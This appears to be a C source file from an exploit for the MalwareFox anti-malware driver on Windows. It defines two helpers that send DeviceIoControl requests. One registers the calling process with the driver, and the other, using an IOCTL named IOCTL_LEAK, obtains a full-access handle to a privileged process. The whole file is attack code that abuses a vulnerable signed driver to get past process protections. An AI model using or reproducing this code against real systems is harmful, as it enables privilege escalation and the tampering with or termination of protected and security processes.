/*!
 * Userspace utilities for registering
 * and acquiring a full-access handle 
 * to a privileged process using the 
 * MalwareFox driver.
!*/
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include "mlwrfox.h"

BOOL RegisterProcess(
  HANDLE hDriver,
  PDWORD UserPid
)
{
  DWORD ReturnByte = 0;
  return DeviceIoControl(hDriver, IOCTL_REG, UserPid, sizeof(DWORD),
		  NULL, 0, &ReturnByte, NULL);
};

BOOL AcquireHandle(
  HANDLE hDriver,
  PDWORD UserPid,
  PHANDLE OutHandle
)
{
  DWORD ReturnByte = 0;
  return DeviceIoControl(hDriver, IOCTL_LEAK, UserPid, sizeof(DWORD),
		  OutHandle, sizeof(HANDLE), &ReturnByte, NULL);
};	